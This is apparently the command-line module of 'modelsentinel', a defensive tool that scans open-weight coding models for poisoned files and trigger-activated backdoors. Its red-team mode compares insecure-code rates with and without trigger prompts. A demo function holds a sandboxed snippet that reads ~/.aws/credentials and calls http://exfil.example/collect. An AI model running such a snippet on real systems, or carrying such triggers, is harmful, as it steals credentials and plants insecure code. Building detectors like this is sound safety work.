"""Command line: sentinel scan | redteam | report | serve | probes | demo."""

from __future__ import annotations

import argparse
import json
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path

from modelsentinel import __version__
from modelsentinel.db import connect, get_scan, list_scans
from modelsentinel.pipeline import default_db_path, scan_source
from modelsentinel.policy import ci_should_block, load_policy
from modelsentinel.report import render

# Presets for real models on CPU. Seconds-per-generation is measured, not assumed:
# see README "Expected runtime".
PRESETS = {
    "quick": {"tasks": 12, "runs": 3, "triggers": "political-regional,dates,language-switch", "max_tokens": 384},
    "standard": {"tasks": 28, "runs": 5, "triggers": None, "max_tokens": 512},
    "full": {"tasks": None, "runs": 8, "triggers": None, "max_tokens": 512},
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="sentinel", description="Offline checks for open-weight coding models.")
    parser.add_argument("--version", action="version", version=f"modelsentinel {__version__}")
    parser.add_argument("--db", default=None, help="SQLite path. Default: .modelsentinel/sentinel.db")
    sub = parser.add_subparsers(dest="cmd", required=True)

    scan = sub.add_parser("scan", help="Hash and scan a local model file or directory. Does not load weights.")
    scan.add_argument("source")
    scan.add_argument("--manifest", default=None)
    scan.add_argument("--policy", default=None)
    scan.add_argument("--format", default="text", choices=["text", "json", "sarif", "html"])
    scan.add_argument("-o", "--output", default=None)
    scan.add_argument("--ci", action="store_true")
    scan.set_defaults(func=_cmd_scan)

    red = sub.add_parser(
        "redteam",
        help="Differential coding tasks with and without YAML triggers.",
        description=(
            "Model specs: ollama:<tag>, llamacpp:<file.gguf> (or a .gguf path), transformers:<dir>, "
            "planted:coder / clean:coder (fixtures). Generations are cached in SQLite, so an "
            "interrupted run resumes where it stopped."
        ),
    )
    red.add_argument("model")
    red.add_argument("--preset", choices=sorted(PRESETS), default=None,
                     help="quick | standard | full. Explicit flags override the preset.")
    red.add_argument("--tasks", default=None,
                     help="N tasks (spread across CWEs), or a YAML file/dir of custom tasks.")
    red.add_argument("--tasks-file", default=None, help="YAML file or directory of custom tasks.")
    red.add_argument("--cwe", default=None, help="Comma list of CWEs to keep, e.g. CWE-78,CWE-89.")
    red.add_argument("--triggers", default=None,
                     help="Comma list of suites or trigger ids (e.g. political-regional,dates/year-2024), "
                          "or a YAML file/dir of custom suites.")
    red.add_argument("--triggers-dir", default=None, help="YAML file or directory of trigger suites.")
    red.add_argument("--runs", type=int, default=None, help="Samples per cell (default 8 fixtures / preset).")
    red.add_argument("--temperature", type=float, default=None, help="Default 0.7 for real models, 0 for fixtures.")
    red.add_argument("--max-tokens", type=int, default=None)
    red.add_argument("--seed", type=int, default=1000, help="Base seed; run i uses seed+i in every arm.")
    red.add_argument("--timeout", type=float, default=300, help="Per-generation timeout in seconds.")
    red.add_argument("--no-controls", action="store_true", help="Skip matched control prompts.")
    red.add_argument("--no-cache", action="store_true", help="Do not read or write the generation cache.")
    red.add_argument("--no-progress", action="store_true")
    red.add_argument("--llamacpp-mode", choices=["server", "cli"], default=None)
    red.add_argument("--threads", type=int, default=None, help="llama.cpp threads.")
    red.add_argument("--ctx", type=int, default=None, help="Context length for llama.cpp / Ollama.")
    red.add_argument("--allow-remote-runtime", action="store_true",
                     help="Allow a non-loopback OLLAMA_HOST. Off by default: scans stay offline.")
    red.add_argument("--judge", default=None,
                     help="Optional trusted local judge model (e.g. ollama:llama3.2) that explains suspicious diffs. "
                          "Must be a different model family. Off by default; never changes the verdict.")
    red.add_argument("--policy", default=None)
    red.add_argument("--sandbox", action="store_true")
    red.add_argument("--limit", type=int, default=None, help=argparse.SUPPRESS)
    red.add_argument("--estimate", action="store_true", help="Print the generation count and an ETA, then exit.")
    red.add_argument("--format", default="text", choices=["text", "json", "sarif", "html"])
    red.add_argument("-o", "--output", default=None)
    red.add_argument("--ci", action="store_true")
    red.set_defaults(func=_cmd_redteam)

    doctor = sub.add_parser("doctor", help="Report which binaries, scanners, runtimes and isolation features are available.")
    doctor.add_argument("--json", action="store_true")
    doctor.set_defaults(func=_cmd_doctor)

    cache = sub.add_parser("cache", help="Inspect or clear the red-team generation cache.")
    cache.add_argument("action", choices=["stats", "clear"])
    cache.add_argument("--model", default=None, help="Model fingerprint to clear (default: all).")
    cache.set_defaults(func=_cmd_cache)

    report = sub.add_parser("report", help="Render a stored scan.")
    report.add_argument("scan_id")
    report.add_argument("--format", default="html", choices=["json", "sarif", "html"])
    report.add_argument("-o", "--output", default=None)
    report.set_defaults(func=_cmd_report)

    probes = sub.add_parser("probes", help="Experimental linear probe on caller-supplied activation JSON.")
    probes.add_argument("--baseline", required=True)
    probes.add_argument("--triggered", required=True)
    probes.set_defaults(func=_cmd_probes)

    demo = sub.add_parser("demo", help="Write fixtures and store the acceptance scans.")
    demo.add_argument("--runs", type=int, default=8)
    demo.set_defaults(func=_cmd_demo)

    serve = sub.add_parser("serve", help="Local dashboard and API.")
    serve.add_argument("--host", default="127.0.0.1")
    serve.add_argument("--port", type=int, default=8741)
    serve.add_argument("--demo", action="store_true", help="Seed the database when it is empty.")
    serve.set_defaults(func=_cmd_serve)

    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except (FileNotFoundError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


def _db(args) -> Path:
    return Path(args.db) if args.db else default_db_path()


def _emit(record: dict, fmt: str, output: str | None) -> None:
    if fmt == "text":
        print(f"verdict: {record['verdict']}  score: {record['score']}")
        print(record.get("summary", ""))
        for finding in record.get("findings") or []:
            if finding["severity"] == "info":
                continue
            print(f"  {finding['severity'].upper():8} {finding['category']:24} {finding['message']}")
        triggers = (record.get("redteam") or {}).get("triggers") or []
        if triggers:
            print("  trigger                                   rate   control  q(base)  q(ctl)")
            for item in sorted(triggers, key=lambda t: t["q_value"])[:10]:
                ctl = "  n/a  " if item.get("control_rate") is None else f"{item['control_rate']:6.1%}"
                qc = "  n/a" if item.get("q_control") is None else f"{item['q_control']:.3g}"
                flag = " *" if item.get("significant") else ""
                print(f"  {item['trigger_id'][:40]:40} {item['insecure_rate']:6.1%}  {ctl}  {item['q_value']:.3g}  {qc}{flag}")
        print(f"scan id: {record['id']}")
        return
    text = render(record, fmt)
    if output:
        Path(output).write_text(text, encoding="utf-8")
        print(output)
    else:
        print(text)


def _finish(record: dict, args, policy: dict) -> int:
    _emit(record, args.format, args.output)
    if args.ci and ci_should_block(record["verdict"], policy):
        return 1
    return 0


def _cmd_scan(args) -> int:
    policy = load_policy(args.policy)
    record = scan_source(args.source, policy=policy, manifest=args.manifest, db_path=_db(args))
    return _finish(record, args, policy)


def _redteam_options(args) -> dict:
    preset = dict(PRESETS.get(args.preset or "", {}))
    tasks_path = args.tasks_file
    task_limit = args.limit if args.limit is not None else preset.get("tasks")
    if args.tasks is not None:
        if str(args.tasks).isdigit():
            task_limit = int(args.tasks)
        else:
            tasks_path = args.tasks
    triggers_path = args.triggers_dir
    trigger_select = preset.get("triggers")
    if args.triggers is not None:
        if Path(args.triggers).exists():
            triggers_path, trigger_select = args.triggers, None
        else:
            trigger_select = args.triggers
    runs = args.runs if args.runs is not None else preset.get("runs", 8)
    adapter_options = {"timeout": args.timeout, "allow_remote": args.allow_remote_runtime}
    if args.llamacpp_mode:
        adapter_options["mode"] = args.llamacpp_mode
    if args.threads:
        adapter_options["threads"] = args.threads
    if args.ctx:
        adapter_options["ctx"] = args.ctx
        adapter_options["num_ctx"] = args.ctx
    return {
        "tasks_path": tasks_path,
        "task_limit": task_limit,
        "triggers_path": triggers_path,
        "trigger_select": trigger_select,
        "cwe": args.cwe,
        "runs": runs,
        "temperature": args.temperature,
        "max_tokens": args.max_tokens or preset.get("max_tokens", 512),
        "seed": args.seed,
        "controls": not args.no_controls,
        "use_cache": not args.no_cache,
        "adapter_options": adapter_options,
        "judge_spec": args.judge,
    }


def _estimate(args, options: dict) -> int:
    from modelsentinel.redteam import _spread
    from modelsentinel.redteam_catalog import load_tasks
    from modelsentinel.triggers import control_of, load_triggers

    tasks = load_tasks(options["tasks_path"])
    if options["cwe"]:
        wanted = {c.strip().upper() for c in options["cwe"].split(",")}
        tasks = [t for t in tasks if t["cwe"].upper() in wanted]
    if options["task_limit"]:
        tasks = _spread(tasks, options["task_limit"])
    triggers = load_triggers(options["triggers_path"], options["trigger_select"])
    controls = {(c["text"], c["placement"]) for t in triggers if (c := control_of(t))} if options["controls"] else set()
    total = len(tasks) * (1 + len(triggers) + len(controls)) * options["runs"]
    print(f"{len(tasks)} tasks x (1 baseline + {len(triggers)} triggers + {len(controls)} controls) x "
          f"{options['runs']} runs = {total} generations")
    for label, seconds in (("fast GPU / Apple silicon", 2.5), ("8-core CPU", 6.0), ("4-core CPU", 12.0)):
        print(f"  ~{total * seconds / 3600:.1f} h at {seconds:.1f} s/generation ({label}, 1.5B Q4, uncached)")
    return 0


def _cmd_redteam(args) -> int:
    from modelsentinel.redteam import run_redteam

    policy = load_policy(args.policy)
    options = _redteam_options(args)
    if args.estimate:
        return _estimate(args, options)
    try:
        record = run_redteam(
            args.model,
            policy=policy,
            sandbox=args.sandbox,
            progress=False if args.no_progress else None,
            cache_db=_db(args),
            **options,
        )
    except KeyboardInterrupt:
        print("\ninterrupted; finished generations are cached. Rerun the same command to resume.", file=sys.stderr)
        return 130
    except RuntimeError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    conn = connect(_db(args))
    try:
        from modelsentinel.db import save_scan

        save_scan(conn, record)
    finally:
        conn.close()
    return _finish(record, args, policy)


def _cmd_doctor(args) -> int:
    from modelsentinel.doctor import collect, render_text

    report = collect()
    print(json.dumps(report, indent=2) if args.json else render_text(report))
    return 0 if report["ready_for_scan"] else 1


def _cmd_cache(args) -> int:
    from modelsentinel.db import cache_clear, cache_stats

    conn = connect(_db(args))
    try:
        if args.action == "clear":
            print(f"removed {cache_clear(conn, args.model)} cached generations")
        else:
            rows = cache_stats(conn)
            if not rows:
                print("cache is empty")
            for row in rows:
                print(f"{row['generations']:7d}  {row['mean_seconds'] or 0:6.2f}s  {row['model']}")
    finally:
        conn.close()
    return 0


def _cmd_report(args) -> int:
    conn = connect(_db(args))
    try:
        record = get_scan(conn, args.scan_id)
    finally:
        conn.close()
    if record is None:
        print(f"error: scan {args.scan_id} not found", file=sys.stderr)
        return 2
    _emit(record, args.format, args.output)
    return 0


def _cmd_probes(args) -> int:
    from modelsentinel.probes import contrast_probe, load_vectors

    result = contrast_probe(load_vectors(args.baseline), load_vectors(args.triggered))
    print(json.dumps(result, indent=2))
    return 0


def seed_demo(db_path: Path, runs: int = 8) -> list[dict]:
    from modelsentinel.fixtureslib import write_fixtures
    from modelsentinel.redteam import run_redteam
    from modelsentinel.db import save_scan

    root = Path(__file__).resolve().parents[2] / "fixtures"
    paths = write_fixtures(root)
    policy = load_policy()
    records = [
        scan_source(str(paths["pkl"]), policy=policy, persist=False),
        scan_source(str(paths["bin"]), policy=policy, persist=False),
        scan_source(str(paths["poisoned_gguf"]), policy=policy, persist=False),
        scan_source(str(paths["clean_gguf"]), policy=policy, persist=False),
        scan_source(str(paths["safe"]), policy=policy, persist=False),
        scan_source(str(paths["remote"]), policy=policy, persist=False),
        scan_source(str(paths["planted"]), policy=policy, persist=False),
        run_redteam(str(paths["planted"]), runs=runs, policy=policy, sandbox=True),
        run_redteam("clean:coder", runs=runs, policy=policy),
        _sandbox_demo_record(),
    ]
    conn = connect(db_path)
    try:
        for record in records:
            save_scan(conn, record)
    finally:
        conn.close()
    return records


def _sandbox_demo_record() -> dict:
    """Store one real sandbox run so the timeline is evidence, not a placeholder."""
    from modelsentinel.findings import Finding
    from modelsentinel.sandboxrun import run_source
    from modelsentinel.scoring import judge

    source = (
        "import os\n"
        "print(open(os.path.expanduser('~/.aws/credentials')).read())\n"
        "import urllib.request\n"
        "try:\n"
        "    urllib.request.urlopen('http://exfil.example/collect', timeout=1)\n"
        "except Exception:\n"
        "    pass\n"
    )
    result = run_source(source, timeout=8)
    findings = []
    if result.get("canary_read") or result.get("outbound_attempt"):
        findings.append(
            Finding(
                severity="critical",
                category="confirmed_exfiltration",
                code="sandbox_confirmed",
                message="Sandbox logged a canary credential read and a blocked outbound HTTP attempt.",
                evidence=(
                    f"canary_read={result.get('canary_read')} outbound_attempt={result.get('outbound_attempt')} "
                    f"network_probe={result.get('network_probe')} filesystem_probe={result.get('filesystem_probe')} "
                    f"enforcement={result.get('enforcement')}"
                ),
            )
        )
    score, verdict = judge(findings)
    events = []
    for event in result.get("events") or []:
        if event.get("probe"):
            continue
        events.append(
            {
                "label": "canary-snippet",
                "kind": event.get("kind", ""),
                "detail": str(event.get("detail") or event.get("event") or "")[:300],
            }
        )
    return {
        "id": uuid.uuid4().hex[:12],
        "created_at": datetime.now(timezone.utc).replace(microsecond=0).isoformat(),
        "source": "sandbox:canary-and-exfil-snippet",
        "source_kind": "sandbox",
        "kind": "sandbox",
        "name": "sandbox canary",
        "verdict": verdict,
        "score": score,
        "summary": "Executed a snippet that reads the canary AWS file and requests http://exfil.example/collect. The request was blocked.",
        "findings": [item.to_dict() for item in findings],
        "files": [],
        "generations": [],
        "sandbox_events": events,
        "redteam": None,
        "sandbox": {
            "samples": 1,
            "canary_read": bool(result.get("canary_read")),
            "outbound_attempt": bool(result.get("outbound_attempt")),
        },
        "limitation": "The sandbox contained this snippet. It does not say anything about a model that was not executed here.",
    }


def _cmd_demo(args) -> int:
    records = seed_demo(_db(args), runs=args.runs)
    for record in records:
        print(f"{record['verdict']:4}  {record['kind']:8}  {record['source']}")
    return 0


def _cmd_serve(args) -> int:
    import uvicorn

    from modelsentinel.api import create_app

    db_path = _db(args)
    if args.demo:
        conn = connect(db_path)
        try:
            empty = not list_scans(conn)
        finally:
            conn.close()
        if empty:
            print("seeding demo scans", flush=True)
            seed_demo(db_path, runs=8)
    app = create_app(db_path)
    uvicorn.run(app, host=args.host, port=args.port, log_level="info")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
